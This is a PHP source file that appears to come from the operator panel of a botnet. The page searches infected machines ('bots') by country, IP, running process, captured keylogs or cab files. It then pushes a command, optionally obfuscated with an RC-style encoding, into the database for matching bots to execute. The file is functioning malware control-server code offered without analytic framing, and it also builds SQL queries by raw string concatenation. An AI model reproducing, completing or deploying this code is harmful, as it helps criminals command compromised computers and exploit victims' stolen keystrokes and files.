<?php

get_function('html_pages');
get_function('real_escape_string');
get_function('sql_inject');
include_once('modules/bots/country_code.php');

if(isset($_POST['update'])){
	if($_SESSION['search']['bots']['mamb'] != $_POST['mamb']){
		$_POST['prefix'] = '';
		$_POST['uid'] = '';
		$_POST['multibot'] = '';
	}

	@array_walk($_POST, "sql_inject");
	@array_walk($_POST, 'real_escape_string');
	unset($_POST['update']);
	foreach($_POST as $key => $value){
		if($key != 'cmd' && $key != 'link'){
			$_SESSION['search']['bots'][$key] = $value;
		}
	}
}

$filter = '';
$sort = '';
$group = '';

if(count($_SESSION['search']['bots'])){
	foreach($_SESSION['search']['bots'] as $key => $value){
		if(!empty($value)){
			switch($key){
				case 'multibot':
					if(empty($_SESSION['user']->config['prefix'])){
						if(!empty($filter)) if($_SESSION['search']['bots']['type'] == 1){ $filter .= ' AND '; }else{ $filter .= ' OR ';}
						$value = str_replace("\r\n", "\n", $value);
						$value = explode("\n", $value);
						if(count($value) > 0){
							$filter .= '(';
							
							foreach($value as $v){
								$v = explode("0", $v, 2);
								$filter .= '(a.prefix = \''.$v[0].'\' AND a.uid = \'0'.$v[1].'\') OR ';
							}
							
							$filter = rtrim($filter, ' OR ');
							$filter .= ')';
						}
					}
				break;
				
				case 'prefix':
					if(!empty($filter)) if($_SESSION['search']['bots']['type'] == 1){ $filter .= ' AND '; }else{ $filter .= ' OR ';}
					if(!empty($_SESSION['user']->config['prefix'])){
						$filter .= '(a.prefix = \''. $_SESSION['user']->config['prefix'].'\') ';
					}else{
						$filter .= '(a.prefix LIKE \''.$value.'%\') ';
					}
				break;
				
				case 'uid':
					if(!empty($filter)) if($_SESSION['search']['bots']['type'] == 1){ $filter .= ' AND '; }else{ $filter .= ' OR ';}
					$filter .= '(a.uid LIKE \''.$value.'%\') ';
				break;
			
				case 'country':
					if(!empty($filter)) if($_SESSION['search']['bots']['type'] == 1){ $filter .= ' AND '; }else{ $filter .= ' OR ';}
					$filter .= '(a.country = \''.$value.'\') ';
				break;
			
				case 'ip':
					if(!empty($filter)) if($_SESSION['search']['bots']['type'] == 1){ $filter .= ' AND '; }else{ $filter .= ' OR ';}
					$filter .= '(a.ip LIKE \''.$value.'%\') ';
				break;
			
				case 'tracking':
					if(!empty($filter)) if($_SESSION['search']['bots']['type'] == 1){ $filter .= ' AND '; }else{ $filter .= ' OR ';}
					$filter .= '(a.tracking = \''.($value-1).'\') ';
				break;
			
				case 'sort':
					switch($value){
						case 'conn1':
							$sort .= ' ORDER by a.last_date ASC';
						break;
					
						case 'conn2':
							$sort .= ' ORDER by a.last_date DESC';
						break;
					}
				break;
			
				case 'process':
					if(!empty($filter)) $filter .= ' AND ';
					$filter .= ' (b.plist LIKE \'%'.$value.'%\') AND (a.prefix = b.prefix) AND (a.uid = b.uid) ';
				break;
			
				case 'logs':
					if(!empty($filter)) $filter .= ' AND ';
					$filter .= ' (c.prefix = a.prefix) AND (c.uid = a.uid) ';
					$group = ' GROUP by a.uid,a.prefix';
				break;
			}
		}
	}
}

$country = $mysqli->query_cache('SELECT DISTINCT(country) country FROM bf_bots', null, 60, true);
$smarty->assign('country', $country);
$smarty->assign('country_code', $country_code);

if(!empty($filter)){
	if($Cur['str'] == 'cmd_set'){
		$cmd = '';
		if(empty($_POST['cmd'])){
			if(!empty($_POST['link'])){
				$cmd = $_POST['link'];
			}else{
				$cmd = '';
			}
		}else{
			if(!empty($_POST['link'])){
				$cmd = $_POST['cmd'] . ' ' . $_POST['link'];
			}else{
				$cmd = $_POST['cmd'];
			}
		}
		
		if($config['scramb'] == 1){
			if(strpos($cmd, '$') === 0){
				$add_cmd = '$';
				$cmd = str_replace('$', '', $cmd);
			}elseif(strpos($cmd, '!!!') === 0){
				$add_cmd = '!!!';
				$cmd = str_replace('!!!', '', $cmd);
			}elseif(strpos($cmd, '!!') === 0){
				$add_cmd = '!!';
				$cmd = str_replace('!!', '', $cmd);
			}elseif(strpos($cmd, '!') === 0){
				$add_cmd = '!';
				$cmd = str_replace('!', '', $cmd);
			}
			
			if(!empty($cmd)){
				get_function('rc');
				$cmd = $add_cmd . rc_encode($cmd);
			}
		}

		if(empty($_SESSION['search']['bots']['logs'])){
			if(empty($_SESSION['search']['bots']['process'])){
				$mysqli->query('update bf_bots a set a.cmd = \''.$cmd.'\' WHERE ' . $filter);
			}else{
				$mysqli->query('update bf_bots a, bf_process b set a.cmd = \''.$cmd.'\' WHERE ' . $filter);
			}
		}elseif($_SESSION['search']['bots']['logs'] == 'keylogs'){
			if(empty($_SESSION['search']['bots']['process'])){
				$mysqli->query('update bf_bots a, bf_keylog_data c set a.cmd = \''.$cmd.'\' WHERE ' . $filter);
			}else{
				$mysqli->query('update bf_bots a, bf_process b, bf_keylog_data c set a.cmd = \''.$cmd.'\' WHERE ' . $filter);
			}
		}elseif($_SESSION['search']['bots']['logs'] == 'cabs'){
			if(empty($_SESSION['search']['bots']['process'])){
				$mysqli->query('update bf_bots a, bf_cabs c set a.cmd = \''.$cmd.'\' WHERE ' . $filter);
			}else{
				$mysqli->query('update bf_bots a, bf_process b, bf_cabs c set a.cmd = \''.$cmd.'\' WHERE ' . $filter);
			}
		}
	}

	if(empty($_SESSION['search']['bots']['logs'])){
		if(empty($_SESSION['search']['bots']['process'])){
			$list = $mysqli->query('SELECT a.id, a.prefix, a.uid, a.country, a.ip FROM bf_bots a WHERE ' . $filter . $sort . ' LIMIT ' . (($Cur['page'] == 0) ? $_SESSION['user']->config['cp']['bots'] : $Cur['page']*$_SESSION['user']->config['cp']['bots'] . ',' . $_SESSION['user']->config['cp']['bots']), null, null, false);
	    	if($_SESSION['search']['bots']['mamb'] != true) $counts = $mysqli->query_name('SELECT COUNT(a.id) count FROM bf_bots a WHERE ' . $filter, null, 'count', 0, 60);
		}else{
			$list = $mysqli->query('SELECT a.id, a.prefix, a.uid, a.country, a.ip FROM bf_bots a, bf_process b WHERE ' . $filter . $sort . ' LIMIT ' . (($Cur['page'] == 0) ? $_SESSION['user']->config['cp']['bots'] : $Cur['page']*$_SESSION['user']->config['cp']['bots'] . ',' . $_SESSION['user']->config['cp']['bots']), null, null, false);
	    	if($_SESSION['search']['bots']['mamb'] != true) $counts = $mysqli->query_name('SELECT COUNT(a.id) count FROM bf_bots a, bf_process b WHERE ' . $filter, null, 'count', 0, 60);
		}
	}elseif($_SESSION['search']['bots']['logs'] == 'keylogs'){
		if(empty($_SESSION['search']['bots']['process'])){
			$list = $mysqli->query('SELECT a.id, a.prefix, a.uid, a.country, a.ip FROM bf_bots a, bf_keylog_data c WHERE ' . $filter . $sort . $group . ' LIMIT ' . (($Cur['page'] == 0) ? $_SESSION['user']->config['cp']['bots'] : $Cur['page']*$_SESSION['user']->config['cp']['bots'] . ',' . $_SESSION['user']->config['cp']['bots']), null, null, false);
	    	if($_SESSION['search']['bots']['mamb'] != true) $counts = $mysqli->query_name('SELECT COUNT(distinct(concat(a.uid,a.prefix))) count FROM bf_bots a, bf_keylog_data c WHERE ' . $filter, null, 'count', 0, 60);
		}else{
			$list = $mysqli->query('SELECT a.id, a.prefix, a.uid, a.country, a.ip FROM bf_bots a, bf_process b, bf_keylog_data c WHERE ' . $filter . $sort . $group . ' LIMIT ' . (($Cur['page'] == 0) ? $_SESSION['user']->config['cp']['bots'] : $Cur['page']*$_SESSION['user']->config['cp']['bots'] . ',' . $_SESSION['user']->config['cp']['bots']), null, null, false);
	    	if($_SESSION['search']['bots']['mamb'] != true) $counts = $mysqli->query_name('SELECT COUNT(distinct(concat(a.uid,a.prefix))) count FROM bf_bots a, bf_process b, bf_keylog_data c WHERE ' . $filter, null, 'count', 0, 60);
		}
	}elseif($_SESSION['search']['bots']['logs'] == 'cabs'){
		if(empty($_SESSION['search']['bots']['process'])){
			$list = $mysqli->query('SELECT a.id, a.prefix, a.uid, a.country, a.ip FROM bf_bots a, bf_cabs c WHERE ' . $filter . $sort . $group . ' LIMIT ' . (($Cur['page'] == 0) ? $_SESSION['user']->config['cp']['bots'] : $Cur['page']*$_SESSION['user']->config['cp']['bots'] . ',' . $_SESSION['user']->config['cp']['bots']), null, null, false);
	    	if($_SESSION['search']['bots']['mamb'] != true) $counts = $mysqli->query_name('SELECT COUNT(distinct(concat(a.uid,a.prefix))) count FROM bf_bots a, bf_cabs c WHERE ' . $filter, null, 'count', 0, 60);
		}else{
			$list = $mysqli->query('SELECT a.id, a.prefix, a.uid, a.country, a.ip FROM bf_bots a, bf_process b, bf_cabs c WHERE ' . $filter . $sort . $group . ' LIMIT ' . (($Cur['page'] == 0) ? $_SESSION['user']->config['cp']['bots'] : $Cur['page']*$_SESSION['user']->config['cp']['bots'] . ',' . $_SESSION['user']->config['cp']['bots']), null, null, false);
	    	if($_SESSION['search']['bots']['mamb'] != true) $counts = $mysqli->query_name('SELECT COUNT(distinct(concat(a.uid,a.prefix))) count FROM bf_bots a, bf_process b, bf_cabs c WHERE ' . $filter, null, 'count', 0, 60);
		}
	}

	if($_SESSION['search']['bots']['mamb'] != true){
		$smarty->assign('counts', $counts);
		$smarty->assign('pages', html_pages('/bots/search.html?', $counts, $_SESSION['user']->config['cp']['bots_country'], 1, 'bots_list', 'this.href'));
	}
	$smarty->assign('list', $list);
}

//print_rm($mysqli->sql)

?>